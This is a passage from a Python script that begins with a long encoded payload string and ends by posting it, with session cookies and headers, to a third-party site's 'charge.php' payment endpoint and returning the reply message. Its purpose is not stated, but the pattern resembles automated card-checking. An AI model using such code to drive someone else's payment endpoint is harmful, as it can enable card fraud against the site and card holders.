Q7lLxhMXFN1YMZwf5WXlZzT+utbuycpCzrJcKU5wq2FPvdlRYHrZEFwPHH5tWlfz4F1/tkRa02/MX5hAvVROZzASIYgfEj4UXrNBPwSmwyKzMSzflwJjSIhmuEAxYCKyRBgZI5OZPWY3kBaCLOb4ljO1QWfxNH5MyxzZifvUDshlX5yDkNis0/UsrqeCuulsHmF6OnwLm3VQ3QCFICSvtorRrRAguTmysSkttIRu54X5QER3Fzu1ZMjQfZWGluZWvOdqPaemgilvWaQNI7bdoUPnZ2a6u8RakjyXWvrjgB6J05lMzwTGOY4L1A5aioRvTRwXDMvcc7zZCCPakm0wLlrHXZf9epYqS8LUqOXTtmxs9CJY0+nH4dH034qt5P/UJfKEmmez9WZq+XLAu7/l3Pp1+E2CTC1WkycEVGFN4TC3p4RRAbr6oXTtx2wIJgv8/dR51Oke3Qf6V3tAmxh9DaW4livWvQTK0a5bZcxh8MA/TDNhE29boecA5JPCKChEA6+EJFTJCa3b6DM1zdF44J33wjMocDa6ht+MbmTMsiz/D4M6Na2x1cZpkwG2SVQcRSRbpgm7C4bE91q7m3Noj99AG5sk7sL7atxKmiwGoewK768m4raKl1ld7MHDRC2rPnGFb03i1o/zjiBQvBQrjdaxuWd/r/4Q+BRpbogG0NvZ8tlWnOcUpn+iNaNbDSP+HrrBU1gKPkem74jdsdPSaHZWqUBqBnxbZunpTOsR66/wHnGbwGHrNHyrTGee279ckcNVZXwfgRRyhIYNvovxkPdyFfU7EVr5qAuDtmWXoiQdCN84+d21dVGWDEeGqk2Xfail0dWp7o57MoHflLPhl6pMmuexRLTBe0gOjs1XxvbNvdZumtPkGaPVTTMNDoFiatR8V2ZeoRrAtWYyKIQM4ddu9xciLoDHqW95fy5LOU/nqz2z1xzK0U8etcfJ4Dule5Dks8b9l/+xHVSgGTyR2139EaOqSPCmqXbTC1dr6NHR9iI0iGFLqvDnCgTK7+7wZicdKOAIxxlLKoLYH474lL/fbBKkilQeCaJMCt8j5rUi6caHLleLYw4EG4JoO+S25Cp6IFOmAbda+g6F3llPzgkusp/IM7N0q01RvzP3iT8gjAU4utuASsEJ8OdfjTOLzPQjqz+dhNGt2eSsGbYpUUp7k9iQZsiQWS3Gp5Ya9kavs8T/SZx8EY+6v9zkAWzjyYiYFVArMSJ32v0nqIKtbnMRs1ZG160KnXZVQAKzrllXYz55pI0d41AVyE1pdrEgGC5/7nER8Hr8PlDxi/rkYoNizwn6qPKT/oWySJ5tdcK/pq71AVzt3UgZKvQJoRq7PlucWznje5HhlDOKNvWv8tlVB/4WeegIAgvkx4y+z3j7P0xeXSl/D55i/KQSR5heFn832oO0Dtud5rlnY6S898w2LzOH5J1D2yFeAsOntbxFpVvOHHidyZjV5yHsWzj3JXUa2GWNC9JI51t6cHND3dFyhECNp2hecBJJPUheGBQN28JYb4ROKQu6rSb0NG7rCx9Zkcusr5/zl6L5OydO7/3A',
	}
	
	response = requests.post('https://app.brandmark.io/v3/charge.php', cookies=cookies, headers=headers, json=json_data)
	return (response.json()['message'])
